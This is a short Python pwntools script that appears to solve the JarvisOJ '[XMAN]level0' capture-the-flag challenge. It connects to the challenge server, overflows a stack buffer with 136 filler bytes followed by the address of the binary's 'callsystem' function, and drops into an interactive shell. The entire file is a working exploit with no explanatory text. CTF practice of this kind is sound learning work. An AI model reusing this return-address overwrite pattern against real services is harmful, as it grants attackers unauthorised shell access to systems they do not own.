from pwn import *


def x_man_level0(file_name='/mnt/hgfs/CyberSecurity/PWN/jarvisoj/[XMAN]level0'):
    print("[XMAN]level0 start")
    io = remote('pwn2.jarvisoj.com', 9881)
    elf = ELF(file_name)

    payload = b'A' * 136
    print(payload)
    system_sh_addr = p64(elf.symbols['callsystem'])

    payload += system_sh_addr

    print(io.recvline())

    io.sendline(payload)

    io.interactive()
    print("[XMAN]level0 end")


if __name__ == '__main__':
    x_man_level0()
